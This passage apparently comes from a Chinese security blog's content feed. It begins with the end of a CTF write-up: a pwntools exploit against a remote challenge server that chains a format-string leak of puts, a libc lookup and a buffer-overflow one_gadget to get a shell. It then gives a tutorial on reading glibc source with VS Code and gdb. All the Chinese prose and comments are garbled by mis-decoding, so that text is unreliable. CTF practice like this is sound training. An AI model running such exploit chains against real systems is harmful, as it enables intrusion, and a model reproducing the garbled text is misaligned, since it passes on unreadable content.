function_">pwn</span>():</span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    p = remote(<span class="string">&#x27;39.99.242.16&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">    over_flow = <span class="number">0x400836</span></span><br><span class="line">    puts_got_addr = <span class="number">0x601018</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;fmt\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;%7$saaaa&#x27;</span> + p64(puts_got_addr) + (<span class="number">0x78</span> - <span class="number">16</span>) * <span class="string">b&#x27;a&#x27;</span> + p64(over_flow)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#ç”¨%sæ³„éœ²å‡ºæ¥çš„åœ°å€åº”è¯¥ç”¨u64æ¥æ¥æ”¶</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;puts_addr---------------&gt;&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    lb = LibcBox()</span><br><span class="line">    lb.add_symbol(<span class="string">&#x27;puts&#x27;</span>, puts_addr)<span class="comment">#è¿™ä¸ªåœ°æ–¹è·Ÿlibcsearcherç”¨æ³•åŸºæœ¬ä¸€æ ·ï¼Œä¸‹é¢ä¹Ÿæ˜¯å»dumpå‡ºæ¥</span></span><br><span class="line">    lb.search(download_so=<span class="number">1</span>)</span><br><span class="line">    libc_base = puts_addr - lb.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    one_addr = <span class="number">0xf03a4</span> + libc_base</span><br><span class="line">    payload = <span class="number">0x78</span> * <span class="string">b&#x27;b&#x27;</span> + p64(one_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ </tag>
            
            <tag> æ ˆå¯¹é½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibcä¸­çš„æºç è¯¥æ€ä¹ˆè¯»</title>
      <link href="/posts/aec37d93.html"/>
      <url>/posts/aec37d93.html</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢ï¼š"><a href="#å†™åœ¨å‰é¢ï¼š" class="headerlink" title="å†™åœ¨å‰é¢ï¼š"></a>å†™åœ¨å‰é¢ï¼š</h2><p>åœ¨PWNçš„å­¦ä¹ è¿‡ç¨‹ä¸­ï¼Œé˜…è¯»glibcçš„æºä»£ç æ˜¯ä¸€é¡¹å¿…å¤‡çš„æŠ€èƒ½ã€‚ä¸€æ–¹é¢è€Œè¨€æœ‰äº›é—®é¢˜éœ€è¦æ·±å…¥åˆ°æºç ä¸­å¯»æ‰¾ç­”æ¡ˆï¼Œå¦ä¸€æ–¹é¢é˜…è¯»æºç æ¥æ¢ç©¶glibcä¸­å‡½æ•°çš„å®ç°æ˜¯å†åˆé€‚ä¸è¿‡çš„æ–¹æ³•(æœ‰å¾ˆå¤šå¸ˆå‚…åšäº†ä¼˜ç§€çš„æ€»ç»“ï¼Œå¯ä¸è®ºæ€ä¹ˆé˜…è¯»ä»–äººçš„æ€»ç»“è¿˜æ˜¯ä¸å¦‚è‡ªå·±å»å®é™…çš„æ¢ç©¶ä¸€ä¸‹)ï¼Œæœ€åä¸€æ–¹é¢ï¼Œåœ¨ä¸æ–­æ¢ç©¶å’Œå­¦ä¹ æºç çš„è¿‡ç¨‹ä¸­å…¶å®ä¹Ÿåœ¨ä¸æ–­çš„è¿›æ­¥å¹¶æ‰“ä¸‹åŸºç¡€ï¼Œå¦‚æ­¤çœ‹æ¥é˜…è¯»glibcä¸­çš„æºç ç™¾åˆ©è€Œæ— ä¸€å®³ã€‚ä½†æˆ‘å¯¹äºç¬¬ä¸€æ¬¡å°è¯•é˜…è¯»æºç çš„å°è±¡é¢‡æ·±ï¼Œæ— ä»ä¸‹æ‰‹ï¼Œä¸çŸ¥æ‰€æªã€‚äºæ˜¯ä¹æˆ‘å†™ä¸‹äº†è¿™ç¯‡æ–‡ç« ï¼Œæ¥å‘å½“åˆå’Œæˆ‘ä¸€æ ·å…¥é—¨çš„å¸ˆå‚…ä»¬æä¾›ä¸€äº›ç»éªŒå’Œå»ºè®®ã€‚</p><p><strong>ç”±äºæœ¬äººæ°´å¹³æœ‰é™ï¼Œæä¾›çš„æ€è·¯å’Œå»ºè®®æœªå¿…æ˜¯æœ€å¥½çš„ï¼Œä½†åº”è¯¥æ˜¯å½“ä¸‹åœ¨æˆ‘çš„è®¤çŸ¥ä¸­å¯¹æˆ‘è€Œè¨€æ˜¯æœ€åˆé€‚çš„äº†ã€‚å¦‚æœæœ‰é”™è¯¯æˆ–æ›´æ–¹ä¾¿çš„åšæ³•ï¼Œå¸ˆå‚…ä»¬ä¹Ÿå¯ä»¥æå‡ºæ¥ã€‚</strong></p><h2 id="1ã€å‡†å¤‡ç¯å¢ƒ-amp-å·¥å…·-amp-æºç "><a href="#1ã€å‡†å¤‡ç¯å¢ƒ-amp-å·¥å…·-amp-æºç " class="headerlink" title="1ã€å‡†å¤‡ç¯å¢ƒ&amp;å·¥å…·&amp;æºç "></a>1ã€å‡†å¤‡ç¯å¢ƒ&amp;å·¥å…·&amp;æºç </h2><p>æˆ‘ä»¬éœ€è¦å…ˆæŠŠç¯å¢ƒå’Œå·¥å…·å‡†å¤‡å¥½ï¼Œè¿™ä¸ªå…¶å®å¾ˆå¥½æã€‚</p><p>æˆ‘ä»¬éœ€è¦å»æä¸€ä¸‹gdbæºç è°ƒè¯•çš„è¿™ä¸ªåŠŸèƒ½ï¼Œå°¤å…¶æ˜¯åœ¨åˆå­¦çš„æ—¶å€™ï¼Œæºç åŸºæœ¬æ¯è¡Œéƒ½çœ‹ä¸æ‡‚(è‡³å°‘å½“æ—¶æˆ‘æ˜¯è¿™æ ·hhh)ï¼Œé‚£å°±å¿…é¡»è¦é…åˆç€gdbåŠ¨æ€è°ƒè¯•çœ‹æºç äº†ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥å»çœ‹ä¸€äº›å˜é‡çš„å€¼ï¼Œä»¥åŠç¨‹åºçš„èµ°å‘åˆæˆ–è€…å‡½æ•°çš„è°ƒç”¨å…³ç³»ç­‰ç­‰ã€‚å¯¹äºæœ€åˆçš„èŒæ–°æ¥è¯´ï¼Œè¿™æ ·å°±èˆ’æœå¾ˆå¤šäº†ã€‚</p><p>å¦‚ä½•æ­å»ºgdbæºç è°ƒè¯•çš„ç¯å¢ƒå¯ä»¥çœ‹æˆ‘çš„è¿™ç¯‡æ–‡ç«   <a href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">here</a></p><p>å…¶æ¬¡å°±æ˜¯å·¥å…·ï¼Œå·¥å…·çš„è¯å»ºè®®é€‰æ‹©vscodeï¼Œè¿™ä¸ªå…·ä½“å’‹æå°±ç™¾åº¦å§ã€‚</p><p>æœ€åæºç åœ¨è¿™é‡Œä¸‹è½½</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://launchpad.net/ubuntu/+source/glibc/</span><br></pre></td></tr></table></figure><p>é‡Œé¢æœ‰å¾ˆå¤šä¸ªç‰ˆæœ¬çš„glibcï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šéœ€è¦çš„è¯æœ€å¥½ä¸‹è½½2.23-0ubuntu3è¿™ä¸ªç‰ˆæœ¬ã€‚</p><p>æœ€åæ‰“å¼€vscodeï¼Œå°†åˆšæ‰ä¸‹è½½çš„glibcçš„æ–‡ä»¶æ‰“å¼€(è¯´å®è¯æ­£å¸¸çš„è¯ä¸‹é¢ä¸¤å¼ å›¾ç‰‡æ²¡å¿…è¦æ”¾ï¼Œå› ä¸ºç°åœ¨åœ¨æˆ‘çœ‹æ¥è¿™äº›æ­¥éª¤åº”è¯¥æ˜¯ç†æ‰€å½“ç„¶ï¼Œä½†æˆ‘åˆå­¦çš„æ—¶å€™å…¶å®è¿è¿™ä¸ªéƒ½ä¸çŸ¥é“ï¼Œä¹Ÿç®—æ˜¯ç»™æ›¾ç»çš„è‡ªå·±çœ‹ä¸€ä¸‹å§)</p><img src="https://s2.loli.net/2022/08/13/95XpLcSAPbKHMWI.png" alt="image-20220812222510249" style="zoom:50%;" /><p>glibcä¸­çš„æ–‡ä»¶æœ‰å¾ˆå¤šï¼Œé€‰æ‹©æˆ‘ä»¬éœ€è¦åˆ†æçš„é‚£ä¸ªå‡½æ•°æ‰€åœ¨çš„æ–‡ä»¶å¤¹å³å¯ã€‚æ¯”å¦‚æˆ‘è¦åˆ†æfopenå‡½æ•°ï¼Œé‚£å°±æ‰“å¼€è¿™ä¸ªlibioè¿™ä¸ªæ–‡ä»¶(æƒ³çŸ¥é“å‡½æ•°åœ¨å“ªä¸ªæ–‡ä»¶å¤¹çš„è¯ï¼Œç™¾åº¦ä¸€ä¸‹å³å¯)</p><p><img src="https://s2.loli.net/2022/08/13/ObFPWU6IGCpvHun.png" alt="image-20220812222621903"></p><h2 id="2ã€vscodeçš„ä¸€äº›å¿«æ·é”®"><a href="#2ã€vscodeçš„ä¸€äº›å¿«æ·é”®" class="headerlink" title="2ã€vscodeçš„ä¸€äº›å¿«æ·é”®"></a>2ã€vscodeçš„ä¸€äº›å¿«æ·é”®</h2><p>è¦è¯´åˆ†ææºç ï¼Œä¸å¾—ä¸æçš„å°±æ˜¯ä¸€äº›å¿«æ·é”®ã€‚ä½¿ç”¨å¿«æ·é”®å’Œä¸ä½¿ç”¨å¿«æ·é”®çš„æ•ˆç‡ç®€ç›´å¤©å·®åœ°åˆ«ã€‚</p><p>å‡è®¾æˆ‘ç°åœ¨åœ¨åˆ†æä»£ç çš„1352è¡Œï¼Œè¿™é‡Œå‡ºç°äº†_IO_default_xsputnå‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬è¦æŸ¥çœ‹è¯¥å‡½æ•°å®šä¹‰çš„åœ°æ–¹çš„è¯ï¼Œctrl+å·¦é”®ç‚¹å‡»è¯¥å‡½æ•°ï¼Œå³å¯è·³è½¬åˆ°å®šä¹‰çš„åœ°æ–¹ã€‚(å¦‚ä¸‹å›¾)</p><p><img src="https://s2.loli.net/2022/08/13/cELKu7FjeRkxwvC.png" alt="image-20220812223435147"></p><p>ä¸‹å›¾æ˜¯æˆ‘ä»¬å·²ç»è·³è½¬åˆ°å‡½æ•°å®šä¹‰çš„åœ°æ–¹äº†ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªå¾ˆéš¾å—çš„äº‹æƒ…å°±æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å›å»åˆšæ‰çš„ä»£ç ç»§ç»­åˆ†æè¿˜è¦æ‰‹åŠ¨å†æ‰¾å›å»ä¹ˆï¼Ÿ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¿«æ·é”®AltåŠ &lt;-é”®(è¿™ä¸ª&lt;-é”®å°±æ˜¯é”®ç›˜é‡Œé‚£ä¸ªä¸Šä¸‹å·¦å³é”®çš„å·¦)è¿”å›åˆ°åˆšåˆšçš„ä»£ç ï¼ŒåŒç†AltåŠ -&gt;é”®å¯ä»¥å†å›åˆ°å‡½æ•°å®šä¹‰çš„åœ°æ–¹ã€‚</p><img src="https://s2.loli.net/2022/08/13/CRyAYrdj6JwGsQp.png" alt="image-20220812223643803" style="zoom:50%;" /><p>ctrl+fæ˜¯åœ¨å½“å‰æ–‡ä»¶æœç´¢æŒ‡å®šçš„å†…å®¹</p><p>ctrl+zå°±æ˜¯æ’¤å›åˆšåˆšçš„ä¸€æ­¥æ“ä½œ</p><h2 id="3ã€å®-amp-å¦‚ä½•æº¯æºè§£å†³é—®é¢˜"><a href="#3ã€å®-amp-å¦‚ä½•æº¯æºè§£å†³é—®é¢˜" class="headerlink" title="3ã€å®&amp;å¦‚ä½•æº¯æºè§£å†³é—®é¢˜"></a>3ã€å®&amp;å¦‚ä½•æº¯æºè§£å†³é—®é¢˜</h2><p>åœ¨glibcæºç åˆ†æä¸­ï¼Œå®å®šä¹‰ååˆ†å¸¸è§(å¦‚æœä¸çŸ¥é“ä»€ä¹ˆæ˜¯å®å¯ä»¥ç™¾åº¦ä¸€ä¸‹)</p><p>æœ‰å¯èƒ½ä½ çœ¼å‰è¿™ä¸ªé™Œç”Ÿçš„ä¸œè¥¿å°±æ˜¯ä¸ªå®ã€‚(åˆå­¦çš„æ—¶å€™ï¼Œæˆ‘çœ‹æºç ä¸€è„¸æ‡µï¼Œå¿ƒæƒ³å’‹è¿™ä¹ˆå¤šä¸œè¥¿æˆ‘éƒ½æ²¡è§è¿‡ï¼Œæˆ‘å­¦çš„å‡çš„cè¯­è¨€ä¹ˆï¼Ÿ)</p><p>ä»¥ä¸‹é¢432è¿™è¡Œä»£ç ä¸ºä¾‹ï¼š</p><p>å‘ç°ä¸Šæ¥å°±æ˜¯ä¸€ä¸ª_IO_size_tå¹²æ‡µèŒæ–°ï¼Œå› ä¸ºä¹‹å‰æ²¡è§è¿‡å•Šã€‚</p><p><img src="https://s2.loli.net/2022/08/13/jeMiwLNGrAVnbHT.png" alt="image-20220812224439901"></p><p>æˆ‘ä»¬ctrl+å·¦é”®æº¯æºä¸€ä¸‹è¿™ä¸ª_IO_size_t(å¦‚ä¸‹å›¾)ï¼Œå‘ç°æ˜¯ä¸ªå®å®šä¹‰ï¼Œä¸è¿‡size_tè¿˜æ˜¯æ²¡è§è¿‡å‘€ï¼Œé‚£å°±ç»§ç»­æº¯æº</p><p><img src="https://s2.loli.net/2022/08/13/AC95BZto1L7rNge.png" alt="image-20220812224614100"></p><p>å‘ç°æœ€ç»ˆæ˜¯typedefç»™unsigned __int64æ–°å®šä¹‰äº†ä¸€ä¸ªåå­—å«åšsize_tï¼ˆä¸æ¸…æ¥štypedefçš„è¯·è‡ªè¡Œç™¾åº¦ï¼‰</p><p><img src="https://s2.loli.net/2022/08/13/D1iZ68ECtof495l.png" alt="image-20220812224707086"></p><p>è¿™ä¸‹å­unsigned int64æˆ‘ä»¬è®¤è¯†äº†ï¼Œè¿™ä¸å°±æ˜¯æ— ç¬¦å·æ•´å½¢å˜é‡ä¹ˆï¼Œoké—®é¢˜è§£å†³ï¼Œæœ€åˆçš„é‚£è¡Œä»£ç å…¶å®å°±æ˜¯unsigned int64 count å®šä¹‰äº†countè¿™ä¸ªå˜é‡ï¼Œä»…æ­¤è€Œå·²ã€‚</p><p>ä¸‹é¢æ”¾ä¸€ä¸ªæˆ‘åˆå­¦æ—¶çš„é—®é¢˜ï¼Œä¸‹é¢è¿™ä¸ªç»“æ„ä½“Elf32_Symä¸ºä»€ä¹ˆæ˜¯16å­—èŠ‚ï¼Ÿ(æˆ‘åœ¨è¿™é‡Œå¹¶ä¸æ˜¯æƒ³è¡¨è¾¾è¿™ä¸ªç»“æ„ä½“æ˜¯å¤šå¤§ï¼Œ<strong>æˆ‘æ˜¯æƒ³å¼ºè°ƒæˆ‘ä»¬åœ¨é¢å¯¹ä¸ä¼šçš„é—®é¢˜çš„æ—¶å€™ï¼Œè§£å†³çš„æ€è·¯åº”è¯¥å¦‚ä½•</strong>)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p>è¿™ä¼¼ä¹æ˜¯åœ¨å®šä¹‰å˜é‡ï¼Ÿ å¯æ˜¯æ²¡å¬è¿‡Elf32_Wordæ˜¯ä¸ªå˜é‡ç±»å‹å•Šã€‚</p><p>é¼ æ ‡å³é”®ä¸€ä¸‹ï¼ˆæˆ‘å½“æ—¶ç”¨çš„æ˜¯VisualStudio ï¼Œå‘ç°æ˜¯æœ‰ä¸ªè½¬åˆ°å®šä¹‰çš„ï¼Œå°±è¯´æ˜è¿™ä¸ªElf32_Wordä¹Ÿæ˜¯ä¸ªè¢«å®šä¹‰çš„ä¸œè¥¿</p><img src="https://s2.loli.net/2022/08/13/TXZfAaqK5Cg3D2l.png" alt="image-20220301130300184" style="zoom:33%;" /><p>åˆ°å®šä¹‰é‚£é‡Œçœ‹ä¸€ä¸‹å‘ç°äº†typedefè¿™ä¸ªä¸œè¥¿å’Œuint32_tï¼Œå¥ˆä½•cçš„åŸºç¡€ä¸ç‰¢ï¼Œgoogleä¸€ä¸‹ã€‚</p><p><img src="https://s2.loli.net/2022/08/13/QmLDs2RXeESOtof.png" alt="image-20220301130416557"></p><p>å‘ç°äº†è¿™ä¸ªä¸œè¥¿å…¶å®å°±æ˜¯ç±»ä¼¼äºæä¾›äº†ä¸€ä¸ªè‡ªå®šä¹‰ç±»å‹çš„åŠŸèƒ½ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œtypedef unsigned int ai;</p><p>é‚£ä¹ˆæ­¤æ—¶çš„aiå°±ç›¸å½“äºunsigned intè¿™ä¸ªä¸œè¥¿äº†ï¼Œå› æ­¤æ¯”å¦‚æˆ‘ä»¬æƒ³å®šä¹‰ä¸€ä¸ªunsigned intç±»å‹çš„å˜é‡bï¼Œå°±å¯ä»¥å†™æˆè¿™æ ·äº†ï¼Œai b;æ­¤æ—¶çš„æ•ˆæœæ˜¯å’Œunsigned int b;æ•ˆæœæ˜¯ä¸€æ ·çš„</p><p>é‚£ä¹ˆè¿™ä¸ªuint32_tåˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿç»§ç»­googleã€‚</p><p>å‘ç°äº†è¿™ä¸ªuint32_tçš„è¿™ä¸ª_tçš„æ„æ€æ˜¯è¿™äº›æ•°æ®ç±»å‹ï¼ˆæŒ‡çš„æ˜¯uint32_t,è€Œå¹¶éElf32_Wordï¼‰æ˜¯é€šè¿‡typedefæ¥å®šä¹‰çš„ï¼Œè€Œä¸æ˜¯æ–°çš„æ•°æ®ç±»å‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»–ä»¬å…¶å®æ˜¯æˆ‘ä»¬å·²çŸ¥çš„ç±»å‹çš„åˆ«åã€‚</p><p>ç„¶åä¸‹é¢è¿™äº›å°±æ˜¯è¿™äº›æ•°æ®ç±»å‹è¢«å®šä¹‰çš„åœ°æ–¹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __int8_t_defined  </span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __int8_t_defined  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">signed</span> <span class="type">char</span> <span class="type">int8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span><span class="type">short</span> <span class="type">int</span> <span class="type">int16_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> <span class="type">int32_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __WORDSIZE == 64  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">int</span> <span class="type">int64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span>  </span></span><br><span class="line">__extension__</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="type">int64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> <span class="type">uint8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> <span class="type">uint16_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __uint32_t_defined  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">uint32_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __uint32_t_defined  </span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __WORDSIZE == 64  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> <span class="type">uint64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span>  </span></span><br><span class="line">__extension__</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="type">uint64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br></pre></td></tr></table></figure><p>å¦‚æ­¤å†å›åˆ°è¿™è¡Œä»£ç   Elf32_Wordst_nameï¼Œå…¶å®å®ƒå°±ç­‰åŒäºunsigned int st_nameï¼Œæ­¤æ—¶åº”è¯¥å°±èƒ½å¤Ÿçœ‹æ‡‚äº†ã€‚</p><p>æœ€åå›åˆ°æœ€å¼€å§‹çš„é‚£ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆè¿™ä¸ªç»“æ„æ˜¯16å­—èŠ‚ï¼Ÿ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p>å› ä¸ºåˆ†åˆ«æŸ¥çœ‹äº†å®šä¹‰ç±»å‹å‘ç°Elf32_Wordå’ŒElf32_Addréƒ½æ˜¯unsigned intç±»å‹ï¼Œè¿™ä¸ªç±»å‹æ˜¯4ä¸ªå­—èŠ‚ï¼Œè€Œunsigned charæ˜¯1ä¸ªå­—èŠ‚ï¼Œè€ŒæŸ¥çœ‹äº†Elf32_Sectionå‘ç°å®ƒæ˜¯è¢«uint16_tå®šä¹‰çš„ï¼Œè€Œuint16_tåˆ™æ˜¯unsigned short intç±»å‹ï¼Œä¸º2ä¸ªå­—èŠ‚ã€‚å› æ­¤æ•´ä¸ªç»“æ„ä½“ä¸º16å­—èŠ‚ã€‚</p><p><strong>ä¸Šé¢ä¸¤ä¸ªç¤ºä¾‹éƒ½æä¾›äº†è§£å†³é—®é¢˜çš„åŸºæœ¬æ€è€ƒæ–¹å¼ï¼Œå¸Œæœ›å¯¹å¸ˆå‚…ä»¬æœ‰å¸®åŠ©</strong></p><h2 id="4ã€åˆ†æä¸€ä¸ªå‡½æ•°æºç é¦–å…ˆåº”è¯¥åšçš„æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#4ã€åˆ†æä¸€ä¸ªå‡½æ•°æºç é¦–å…ˆåº”è¯¥åšçš„æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="4ã€åˆ†æä¸€ä¸ªå‡½æ•°æºç é¦–å…ˆåº”è¯¥åšçš„æ˜¯ä»€ä¹ˆï¼Ÿ"></a>4ã€åˆ†æä¸€ä¸ªå‡½æ•°æºç é¦–å…ˆåº”è¯¥åšçš„æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>æˆ‘è¿™é‡Œæä¾›ä¸€ä¸ªåˆå­¦è€…æœ€å¼€å§‹åˆ†ææºç çš„ä¸€ä¸ªæ€è·¯ã€‚</p><p>ä»¥æˆ‘æœ€åˆåˆ†æfopenå‡½æ•°æºç ä¸ºä¾‹ï¼Œé¦–å…ˆè‚¯å®šæ˜¯è¦æŠŠvscodeæ‰“å¼€ï¼Œç¡®ä¿è‡ªå·±æ‰‹é‡Œæœ‰ä¸€ä»½æºç (è€Œéåªçœ‹æŸç¯‡æ–‡ç« å‡ºç°çš„æºç )ï¼Œç„¶åå…ˆç”¨gdbå»è°ƒè¯•ï¼Œè¿™æ¬¡è°ƒè¯•çœ‹ä»€ä¹ˆï¼Ÿå¯¹äºåˆå­¦è€…è€Œè¨€ï¼Œç¬¬ä¸€æ¬¡åº”è¯¥æ˜¯å•¥éƒ½çœ‹ä¸æ‡‚ï¼Œé‚£ä¹Ÿè¦ç¡¬ç€å¤´çš®æŠŠæ•´ä¸ªå‡½æ•°çš„æ±‡ç¼–æŒ‡ä»¤éƒ½siç»™æ‰§è¡Œä¸€é(å°±æœ€èµ·ç å¯¹æ•´ä¸ªå‡½æ•°è°ƒç”¨çš„å‡½æ•°æ•°é‡ï¼Œå“ªäº›å‡ºç°é¢‘ç‡é«˜çš„å‡½æ•°èµ·ç æœ‰ä¸ªå°è±¡)ï¼Œç„¶åç¬¬äºŒæ¬¡åœ¨æŠŠæ•´ä¸ªå‡½æ•°çš„æ±‡ç¼–æŒ‡ä»¤éƒ½siç»™æ‰§è¡Œä¸€éï¼Œè¿™æ¬¡å»è§‚å¯Ÿå¹¶è®°å½•æœŸé—´è°ƒç”¨çš„å‡½æ•°å…³ç³»(æœ€å¥½æ˜¯æ‹¿å›¾ç”»ä¸‹æ¥)ï¼Œçœ‹ä¸æ‡‚å‡½æ•°å…³ç³»ä¹Ÿæ²¡äº‹ï¼Œä½†è‡³å°‘è¦å»ç”»ä¸€éæˆ–è€…å†™ä¸€éã€‚(å°±å¦‚ä¸‹å›¾è¿™æ ·)</p><p><img src="https://s2.loli.net/2022/08/13/LTdExvIBYAWhaeZ.png" alt="image-20220813082114252"></p><p>ç°åœ¨æˆ‘ä»¬å·²ç»é€šè¿‡è‡ªå·±çš„è°ƒè¯•æœ‰äº†ä¸€ä»½â€œåœ°å›¾â€ï¼Œç„¶åå¼€å§‹å¯¹ç€vscodeæºç å¼€å§‹ä»å¤´åˆ†æã€‚å› ä¸ºåˆšå¼€å§‹è‚¯å®šæœ‰å¾ˆå¤šåœ°æ–¹éƒ½ä¸æ‡‚ï¼Œé‚£æˆ‘ä»¬æ‰€è°“çš„åˆ†æå°±ä¼šå˜çš„å¼‚å¸¸å›°éš¾ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥å…ˆè¯•ç€é¢„æµ‹å‡½æ•°çš„èµ°å‘ä»¥åŠæ‰§è¡Œåå¯èƒ½çš„ç»“æœã€‚</strong></p><p>ä¸¾ä¸ªæœ€ç®€å•çš„ä¾‹å­:</p><p>ä¸‹é¢çš„ä»£ç å°±æ˜¯fopenå‡½æ•°çš„æœ€å¼€å§‹éƒ¨åˆ†ï¼Œå‘ç°åœ¨69è¡Œæ‰§è¡Œäº†mallocå‡½æ•°ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥<del>çŒœæµ‹</del>æ¨æ–­__fopen_internalå‡½æ•°å°±ä¼šè°ƒç”¨mallocå‡½æ•°ï¼Œè€Œmallocç”³è¯·çš„å†…å­˜å¤§å°åº”è¯¥æ˜¯locked_FILEç»“æ„ä½“çš„å¤§å°ï¼Œè€Œè¿”å›çš„åœ°å€åˆ™ç»™äº†new_fã€‚(å¦‚ä¸‹å›¾)</p><img src="https://s2.loli.net/2022/08/13/89enG1XHJkFdirb.png" alt="image-20220813082708464" style="zoom:50%;" /><p>å› ä¸ºæ˜¯åˆå­¦æ—¶çš„æºç åˆ†æï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½ä¿è¯ç™¾åˆ†ç™¾æ˜¯è¿™æ ·çš„ï¼Œé‚£æˆ‘ä»¬å°±ç”¨åŠ¨æ€è°ƒè¯•æ¥çœ‹çœ‹æ˜¯ä¸æ˜¯è¿™æ ·çš„ï¼Œå‘ç°åŠ¨æ€è°ƒè¯•åˆ°è¿™é‡Œï¼Œç¡®å®æ‰§è¡Œåˆ°äº†è¿™é‡Œã€‚</p><p><img src="https://s2.loli.net/2022/08/13/HSQ13JrKZWyxwER.png" alt="image-20220813083404379"></p><p>æˆ‘ä»¬æ‰§è¡Œè¿™è¡Œä»£ç åå†çœ‹ä¸‹locked_FILEç»“æ„ä½“çš„å¤§å°(å¦‚ä¸‹)ï¼Œå› æ­¤åˆ¤æ–­ç”³è¯·çš„å †å—å¤§å°æœ€ç»ˆä¸º0x231(0x220+0x10+0x1)</p><p><img src="https://s2.loli.net/2022/08/13/wyGRTcgW2NbDqmu.png" alt="image-20220813083513162"></p><p><img src="https://s2.loli.net/2022/08/13/AJKH4MogpXh3GtS.png" 